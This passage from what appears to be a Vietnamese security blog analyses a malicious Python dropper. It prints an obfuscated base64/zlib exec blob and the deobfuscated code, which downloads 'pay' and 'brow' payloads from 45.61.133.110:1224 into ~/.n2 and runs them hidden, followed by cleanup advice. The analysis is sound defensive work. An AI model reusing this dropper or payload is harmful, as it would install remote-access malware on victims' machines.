<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ = <span class="keyword">lambda</span> __ : <span class="built_in">__import__</span>(<span class="string">&#x27;zlib&#x27;</span>).decompress(<span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>).b64decode(__[::-<span class="number">1</span>]));<span class="built_in">exec</span>((_)(<span class="string">b&#x27;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&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>Đây là đoạn mã độc thứ 2 mà attacker tải về nhưng nó đã ofuscated mình sẽ tiến hành deofuscated nó.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,platform,os,subprocess,sys</span><br><span class="line"><span class="keyword">try</span>:<span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">except</span>:subprocess.check_call(sys.executable, <span class="string">&#x27;-m&#x27;</span>, <span class="string">&#x27;pip&#x27;</span>, <span class="string">&#x27;install&#x27;</span>, <span class="string">&#x27;requests&#x27;</span>);<span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sType = <span class="string">&quot;106&quot;</span></span><br><span class="line">gType = <span class="string">&quot;81&quot;</span></span><br><span class="line">ot = platform.system()</span><br><span class="line">home = os.path.expanduser(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">host1123 = <span class="string">&quot;10.10.51.212 go to hell&quot;</span></span><br><span class="line">host1 = <span class="string">&quot;45.61.133.110&quot;</span></span><br><span class="line">host2 = <span class="string">f&#x27;http://°host1ç:1224&#x27;</span></span><br><span class="line">pd = os.path.join(home, <span class="string">&quot;.n2&quot;</span>)</span><br><span class="line">ap = pd + <span class="string">&quot;/pay&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_payload</span>():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(ap):</span><br><span class="line">        <span class="keyword">try</span>:os.remove(ap)</span><br><span class="line">        <span class="keyword">except</span> OSError:<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pd):os.makedirs(pd)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ot==<span class="string">&quot;Darwin&quot;</span>:</span><br><span class="line">            aa = requests.get(host2+<span class="string">&quot;/payload1/&quot;</span>+sType+<span class="string">&quot;/&quot;</span>+gType, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">            aa = requests.get(host2+<span class="string">&quot;/payload/&quot;</span>+sType+<span class="string">&quot;/&quot;</span>+gType, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(ap, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:f.write(aa.content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            aa = requests.get(host2+<span class="string">&quot;/payload/&quot;</span>+sType+<span class="string">&quot;/&quot;</span>+gType, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(ap, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:f.write(aa.content)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">res=download_payload()</span><br><span class="line"><span class="keyword">if</span> res:</span><br><span class="line">    <span class="keyword">if</span> ot==<span class="string">&quot;Windows&quot;</span>:subprocess.Popen(sys.executable, ap, creationflags=subprocess.Popen(</span><br><span class="line">    [sys.executable, ap],</span><br><span class="line">    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP</span><br><span class="line">))</span><br><span class="line">    <span class="keyword">else</span>:subprocess.Popen(sys.executable, ap)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ot==<span class="string">&quot;Darwin&quot;</span>:sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ap = pd + <span class="string">&quot;/bow&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_browse</span>():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(ap):</span><br><span class="line">        <span class="keyword">try</span>:os.remove(ap)</span><br><span class="line">        <span class="keyword">except</span> OSError:<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pd):os.makedirs(pd)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        aa=requests.get(host2+<span class="string">&quot;/brow/&quot;</span>+ sType +<span class="string">&quot;/&quot;</span>+gType, allow_redirects=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(ap, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:f.write(aa.content)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">res=download_browse()</span><br><span class="line"><span class="keyword">if</span> res:</span><br><span class="line">    <span class="keyword">if</span> ot==<span class="string">&quot;Windows&quot;</span>:subprocess.Popen(</span><br><span class="line">    [sys.executable, ap],</span><br><span class="line">    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li>Đây là một dạng Dropper&#x2F;Backdoor, tại đây nó thực hiện tải 2 file thự thi về máy từ xa.</li>
<li>Dữ liệu tải về được lưu trong thư mục ẩn .n2 trong thư mục người dùng (~&#x2F;.n2).</li>
<li>Nếu hệ điều hành là macOS, chương trình sẽ thoát sau bước đầu tiên.</li>
<li>Nó đang tải rất nhiều file khả nghi như <code>pay</code>,<code>brow</code> và thư mục <code>.n2</code>.</li>
<li>Vì nó không còn hoạt động nên mình không thể tải file về và phân tích tiếp nhưng tới đây mình đoán là một con RAT.</li>
</ul>
<h1 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h1><ul>
<li>Nếu đã chạy: kiểm tra thư mục <code>~/.n2</code>, xóa các file <code>pay</code>, <code>bow</code> và toàn bộ thư mục <code>.n2</code>.</li>
<li>Kiểm tra file .bashrc, .zshrc, .profile, crontab -l để phát hiện mã khởi động lại.</li>
<li>Kiểm tra log kết nối mạng đến địa chỉ IP 45.61.133.110.</li>
<li>Xóa các file tải về: <code>rm -rf ~/.n2</code>.</li>
<li>Các bạn sau này cần chú ý hơn về việc chạy các file không rõ nguồn gốc một cách tự tiện.</li>
</ul>
<hr>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/08/19/hcmusctf2025/"
      title="Reverse/HCMUS-CTF 2025"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Reverse/HCMUS-CTF 2025
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/08/18/Alien-Saboteur/"
      title="Reverse/Alien Saboteur"
     >

    <p class="title-text">
      
        Reverse/Alien Saboteur
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 nukoneZ<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
